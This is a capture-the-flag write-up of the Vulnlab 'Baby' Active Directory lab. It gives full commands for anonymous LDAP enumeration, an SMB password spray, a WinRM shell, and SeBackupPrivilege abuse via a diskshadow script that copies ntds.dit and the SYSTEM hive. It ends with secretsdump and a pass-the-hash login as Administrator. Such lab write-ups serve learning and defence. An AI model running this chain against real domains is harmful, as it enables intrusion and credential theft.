## Intoduction

In this write-up, I’ll walk you through the Active Directory lab "Baby" from Vulnlab, a solo Windows machine designed for junior-level users exploring Active Directory exploitation. The lab focuses on two fundamental techniques: LDAP enumeration, which involves querying the domain for information about users, groups, and other AD objects, and Windows privilege escalation through the abuse of SeBackupPrivilege, a misconfigured right that can be leveraged to gain SYSTEM-level access. 

## Active Directory Overview
**Active Directory**

> Active Directory (AD) is a directory service by Microsoft that stores information about objects on the network, including users, groups, and computers.To identify Active Directory (AD) on a network using Nmap, you can scan for common AD-related ports such as LDAP (Port 389), LDAPS (Port 636), Kerberos (Port 88), SMB (Port 445), and DNS (Port 53). Running a command like nmap -p 389,636,88,445,53 --script=default,smb-os-fingerprint <target_ip_range>
{: .prompt-tip }

**Tools Breakdown**

> NetExec(nxc): network execution tool for interacting with various services remotely, supporting protocols like VNC, SSH, WINRM, MSSQL, FTP, LDAP, RDP, WMI, NFS, SMB. It allows for remote code execution and service interaction using valid credentials across different network protocols.

> BloodHound: A tool for Active Directory enumeration that maps out attack paths and privilege escalation opportunities in AD environments.

> Evil-WinRM: A tool to remotely access Windows machines via WinRM using valid credentials for shell access.

## Enumeration

### LDAP
> LDAP (Lightweight Directory Access Protocol) is a protocol used to access and manage directory services over a network. Think of it as a system that helps organize and retrieve data in a networked environment, similar to how a phonebook organizes contact information.
{: .prompt-tip }

After identifying that port 389 (LDAP) is open during initial scanning, I proceeded to enumerate the LDAP service. I started by checking for anonymous access, which was enabled and allowed me to retrieve useful domain information.

**Anonymous Access**

```bash
ldapsearch -x -H ldap://10.10.116.106 -b "DC=baby,DC=vl"
```

**Users**

```bash
ldapsearch -x -H ldap://10.10.116.106 -b "DC=baby,DC=vl" -D 'baby.vl' 'objectClass=user' | grep "sAMAccountName:" | cut -d' ' -f2 | tee loots/users.txt
```

**Descriptions**

While exploring LDAP further, I queried the description attribute for all user objects to check if any sensitive information was stored there. It’s not uncommon for misconfigured environments to contain passwords or hints in user descriptions.

```bash
ldapsearch -x -H ldap://10.10.116.106 -b "DC=baby,DC=vl" -D 'baby.vl' 'objectClass=user' | grep "description:"
```

### SMB
> SMB (Server Message Block) is a network protocol used for providing shared access to files, printers, and other network resources in a network. It allows applications to read and write to files and request services from server programs in a computer network. 
{: .prompt-tip }

**SMB Password Spray**

With the list of users gathered from LDAP and a password (`BabyStart123!`), I attempted a password spray attack using `nxc (nextExec)` over `SMB` to see if the credentials worked for any of the accounts. This approach tests one password across multiple usernames to `avoid account lockouts`.
The spray resulted in a successful hit, but the response indicated `STATUS_PASSWORD_MUST_CHANGE`.This means the account is valid and the credentials are correct, but the user is forced to change the password on first login, a common situation for service accounts or newly created users.

```bash
nxc smb 10.10.116.106 -u loots/users.txt -p 'BabyStart123!' --continue-on-success
```
![alt text](/assets/screenshots/baby/3.png)

Password Change
Proceeded to change the password using the smbpasswd utility.I authenticated with the current password and was prompted to set a new one. After successfully changing it to `NewSecurePass123!`, I re-tested access using `nxc`

```bash
smbpasswd -r 10.10.116.106 -U Caroline.Robinson
```

![alt text](/assets/screenshots/baby/4.png)

![alt text](/assets/screenshots/baby/5.png)

This time, the login worked without issues. With valid credentials and no password change required, I now had authenticated access to the system as Caroline.Robinson, ready to enumerate further 

```bash
nxc smb 10.10.116.106 -u Caroline.Robinson -p 'NewSecurePass123!' --users
```

![alt text](/assets/screenshots/baby/6.png)



## Initial Access

With the credentials for Caroline.Robinson confirmed and no further password restrictions, I attempted to gain a shell on the target using WinRM (Windows Remote Management). First, I tested connectivity using nxc to confirm WinRM was accessible with the current credentials:

```bash
nxc winrm 10.10.116.106 -u Caroline.Robinson -p 'NewSecurePass123!'
```

```bash
evil-winrm -i 10.10.116.106 -u Caroline.Robinson -p 'NewSecurePass123!'
```

## PrivEsc

### Bloodhound

To identify potential privilege escalation paths, I used BloodHound via the bloodhound-python collector while authenticated as Caroline.Robinson. This tool is extremely useful in Active Directory environments to visualize relationships, permissions, and privilege chains.

```bash
bloodhound-python -d baby.vl  -c all -u 'Caroline.Robinson' -p 'NewSecurePass123!'  -ns 10.10.116.106 --zip
```

**First Degree Group Membership**

I noticed that the user Caroline.Robinson was a first-degree group member of Backup Operators, a built-in Windows group with special privileges. To confirm this manually, I checked the user privileges directly from the shell.The output confirmed that the user indeed had the SeBackupPrivilege assigned — a powerful privilege that can be abused to read arbitrary files, including the registry or even the NTDS.dit file, by backing them up and extracting sensitive data like hashes.

![alt text](/assets/screenshots/baby/11.png)

**Abusing SeBackupPrivilege**

With SeBackupPrivilege confirmed, I proceeded to abuse it using DiskShadow to create a Volume Shadow Copy and extract sensitive files like `ntds.dit` (which contains password hashes) and the `SYSTEM` registry hive (needed to decrypt the hashes).

I created a vss.dsh script with the following content:

```bash
set context persistent nowriters
set metadata c:\programdata\cyb4x.cab
set verbose on
add volume c: alias cyb4x
create
expose %cyb4x% z:
```

![alt text](/assets/screenshots/baby/12.png)

```bash
diskshadow /s vss.dsh
```

![alt text](/assets/screenshots/baby/13.png)

**Volume Shadow Copy**

This successfully mounted the shadow copy to the Z: drive. I was then able to copy the sensitive files using robocopy and reg.exe:

```bash
robocopy /b z:\windows\ntds . ntds.dit
```

![alt text](/assets/screenshots/baby/14.png)

also

```bash
reg.exe save hklm\system system
```

**Transferring Files**

Once both the `ntds.dit` and `system` hive files were obtained, I used `evil-winrm` `upload/download` functionality to exfiltrate them for offline secrets dumping:

![alt text](/assets/screenshots/baby/15.png)

**Dumping Secrets**

With both the `ntds.dit` and `system` hive files successfully extracted, I used `Impacket secretsdump`.py to extract hashes.

```bash
secretsdump.py -system system -ntds ntds.dit local
```

![alt text](/assets/screenshots/baby/16.png)

**Pass-the-Hash(PtH)**

Instead of cracking the hash, I performed a `Pass-the-Hash (PtH)` attack using `evil-winrm`, which allows authentication directly with the `NTLM` hash:

```bash
evil-winrm -i 10.10.89.186 -u Administrator -H ee4457ae59f1e3fbd764e33d9cef123d
```
